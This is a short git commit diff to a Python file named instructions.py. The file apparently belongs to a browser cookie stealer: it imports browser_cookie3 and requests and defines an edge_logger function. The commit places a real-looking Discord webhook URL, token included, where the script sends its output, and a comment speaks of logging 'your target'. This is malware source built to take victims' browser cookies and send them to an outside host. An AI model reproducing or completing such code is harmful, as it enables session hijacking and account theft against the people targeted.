cf11838cd806a1697b97398b948106e76da6c55e
MDev123 <86262715+MDev123@users.noreply.github.com>
2022-07-29 13:43:31 -0400

    Update instructions.py

--- instructions.py
+++ instructions.py
@@ -1,5 +1,5 @@
 import browser_cookie3, requests, threading
 
-webhook = "" # Webhook here and make sure to compile if you wanna log your target
+webhook = "https://discord.com/api/webhooks/1002631161417302107/o7fJRxFpkFU-0J_ueZvNq326jUiGxXX_zogRZsQ10M0wxhXj_rC7-Y6G2_Gh4s3BMGv5" # Webhook here and make sure to compile if you wanna log your target
 
 def edge_logger():
